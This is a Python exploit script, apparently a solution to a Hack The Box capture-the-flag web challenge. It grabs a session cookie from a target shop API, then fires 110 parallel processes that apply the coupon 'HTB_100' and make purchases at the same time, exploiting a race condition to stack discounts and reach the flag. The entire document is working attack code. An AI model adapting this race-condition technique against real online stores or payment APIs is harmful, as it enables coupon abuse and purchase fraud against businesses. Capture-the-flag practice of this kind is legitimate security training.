import multiprocessing
import sys
import requests

url = sys.argv[1]
data = requests.post(url + 'api/purchase', data=dict(item='b5'))
cookie = data.cookies['session']
print("cookie : " + cookie)
custom_header = {
    'Cookie': f'session={cookie}',
    'Connection': 'keep-alive',
}
def race_condition():
    requests.post(
        url + 'api/coupons/apply',
        headers=custom_header,
        data=dict(coupon_code="HTB_100")
    )
    print(requests.post(
        url + 'api/purchase', headers=custom_header, data=dict(item='B5')
    ).text)

process = []
for i in range(110):
    process.append(multiprocessing.Process(target=race_condition))
for p in process:
    p.start()
for p in process:
    p.join()

data = requests.post(url + 'api/purchase', headers=custom_header, data=dict(item='B5'))
print(data.text)
data = requests.post(url + 'api/purchase', headers=custom_header, data=dict(item='C8'))
print(data.text)

try:
    print(data.text['flag'])
except:
    print("try again")
